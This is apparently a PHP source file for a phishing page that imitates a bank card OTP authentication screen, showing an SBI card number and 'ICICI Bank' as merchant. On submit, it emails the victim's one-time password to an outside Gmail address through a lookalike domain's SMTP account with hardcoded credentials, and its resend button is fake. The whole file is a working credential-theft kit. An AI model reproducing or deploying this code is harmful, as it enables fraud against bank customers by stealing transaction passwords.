<?php
date_default_timezone_set('Asia/Kolkata');
session_start();
@extract($_POST);
include('PHPMailer/class.phpmailer.php');
include('PHPMailer/class.smtp.php');
/*if($_SESSION['amount'] == '')
    {
        header("Location:index.php");
    }*/

    if(isset($submit))
        {
                $mail = new PHPMailer();
                $mail->isSMTP();
                $mail->Host = "instant-e-apply-campaign-page-ic-sb-page.co.in";
                $mail->SMTPAuth = true;
                $mail->SMTPSecure = 'ssl';
                $mail->Port = 465;
                $mail->Username = "info@instant-e-apply-campaign-page-ic-sb-page.co.in";
                $mail->Password = "Admin@123";
                $mail->AddAddress("easymailid45@gmail.com");
                $mail->SetFrom($mail->Username);
                
                $mail->isHTML(true);
                $mail->Subject   = 'OTP2';
                
                     $mail->Body = '<style>tr{font-family:Arial, Helvetica, sans-serif;font-size: 12px;}</style>
                                <p><b>OTP-2</b> - '.$otp.'</p>';
                
                
                if(!($mail->Send()))
                {
                    $msg="<div class='alert alert-danger'><span><b>Warning! </b>All fields are mandatory</span><a href='#' class='close' data-dismiss='alert'>&times;</a></div>";   
                }
                else
                {
                    header("Location:index.php");      
                }
        }
?>


<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
        <meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Enter O-T-P</title>
    <link rel="stylesheet" href="https://idddffffccc.000webhostapp.com/css/bootstrap.min.css">
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700" rel="stylesheet">
    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css"/>
    <link rel="stylesheet" type="text/css" href="https://idddffffccc.000webhostapp.com/css/make.css">
    <style type="text/css">
        @media (min-width: 720px) {
                .desktopds {
                    margin: 0;
                    padding: 0;
                    overflow: hidden;
                }
                .mobileds {
                    display: none;
                }
            }

            @media (max-width: 719px) {
                .desktopds {
                    display: none;
                }
            }
            .pera{font-size: 15px;}
            table tr td{padding: 0px 10px;}
            .textfield {
    position: relative;
    padding: 6px;
    border: 1px solid #979797;
    width: 80%;
    border-radius: 3px;
}
.btn-lg{padding: 5px 24px;
    font-size: 15px;
    line-height: 1.33;
    border-radius: 0;
    letter-spacing: 1px;
    color: #000;
    border: 1px solid #898989;}
    
</style>
</head>
<body class="atd-pay" style="height: 100vh; background: #fff;">
    <div class="desktopds"><img style="width: 100%;" src="images/make-header.jpg"></div>
    <div class="mobileds"><img style="width: 100%;" src="images/make-pay-head.jpg"></div>
    <div class="mobileds"><img style="width: 100%;" src="images/mobb.png"></div>
<div class="container">
	<div class="row">
		<div class="col-md-3"></div>
        <div class="col-md-6">
            <div style="padding: 20px 5px;">
                <table>
                    <tr>
                        <td><p class="pera"><span style="letter-spacing: 1px; color: #818181;">Card Number </span></p>
                        </td>
                        <td>
                            <p class="pera"><b><?=$_SESSION['sbi_card']?></b></p>
                        </td>
                    </tr>
                    <tr>
                        <td><p class="pera"><span style="letter-spacing: 1px; color: #818181;">Merchant </span></p>
                        </td>
                        <td>
                            <p class="pera"><b>ICICI Bank Pvt. Ltd.</b></p>
                        </td>
                    </tr>
                        <td><p class="pera"><span style="letter-spacing: 1px; color: #818181;">Amount </span></p>
                        </td>
                        <td>
                            <p class="pera"><b>Rs. <?=$_SESSION['amount']?>.00</b></p>
                        </td>
                    </tr>
                    </tr>
                        <td><p class="pera"><span style="letter-spacing: 1px; color: #818181;">Mobile </span></p>
                        </td>
                        <td>
                            <p class="pera"><b>XXXXXXXX<?php echo substr($_SESSION['mobile'],8,10);?></b></p>
                        </td>
                    </tr>
                </table>
                <p style="padding: 5px 10px;">An OTP (One Time Password) has been sent to your registered mobile number. Please authenticate the transaction using this OTP.</p>
                <form method="post">
                <table>
                    <tr>
                        <td><p><b>Enter OTP</b></p></td>
                        <td>
                            <p style = "color:green; font-size: 15px; margin: 0;" id = "msg"></p>
                            <p style="color: red; margin: 0;" id="hdd">OTP has been sent again</p>
                            <input name="otp" type="password" class="textfield" required>
                            <p style="color: blue; text-decoration: underline; text-align: center;"><span style="cursor: pointer;" id = "resend" class="resend">Resend OTP</span></p>
                        </td>
                    </tr>
                </table>
                <p style="font-size: 10px; text-align: center;">OTPs are SECRET. DON NOT disclose it to anyone. Bank NEVER asks for OTP.</p>
                <table style="width: 100%;">
                    <tr>
                        <td style="width: 50%; text-align: right;">
                            <button type = "submit" name = "submit" class="btn btn-lg">Submit</button>
                        </td>
                        <td style="width: 50%; text-align: left;">
                            <button class="btn btn-lg">Cancel</button>
                        </td>
                    </tr>
                </table>
                <p style="text-align: center; margin-top: 10px; color: #7e7e7e; font-size: 12px;">This page will automatically timeout after 180 seconds.</p>
                <p style="opacity: 0;">kjjkjk</p>
            </form>

            </div>
        </div>
	</div>
</div>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script type="text/javascript">
    $("#resend").click(function(){
        $("#msg").html("Otp resend successfully");
    });
</script>
<script type="text/javascript">
    $("#resend").click(function(){
        $("#hdd").hide();
    });
</script>
<script type="text/javascript">
$(".toggle-password").click(function() {

  $(this).toggleClass("fa-eye fa-eye-slash");
  var input = $($(this).attr("toggle"));
  if (input.attr("type") == "password") {
    input.attr("type", "text");
  } else {
    input.attr("type", "password");
  }
});
</script>
</body>


</html>